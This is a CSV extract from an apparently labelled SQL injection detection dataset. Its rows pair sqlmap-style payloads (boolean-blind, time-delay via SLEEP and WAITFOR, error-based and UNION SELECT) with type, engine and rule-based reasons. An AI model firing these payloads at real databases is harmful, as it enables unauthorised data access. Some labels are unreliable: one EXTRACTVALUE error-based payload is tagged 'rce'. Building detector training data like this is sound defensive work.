row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3630,"1' ) ) as dtwh where 9633 = 9633 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,9633 = 9633 and detected — boolean_blind injection (priority 8) on generic,rule-based
3631,1 ) as rlft where 1670 = 1670 waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3632,"1"" ) as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
3633,"-6406%' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
3634,-9311 ) ) or ( 5065 = 2572 ) *2572 and ( ( 1199 = 1199,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
3635,"1"" ) as tnux where 4888 = 4888 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3636,"1' ) ) and elt ( 6847 = 5874,5874 ) and ( ( 'yspu' = 'yspu",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3637,"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3638,"1"" where 2677 = 2677 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
3639,"1%""",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
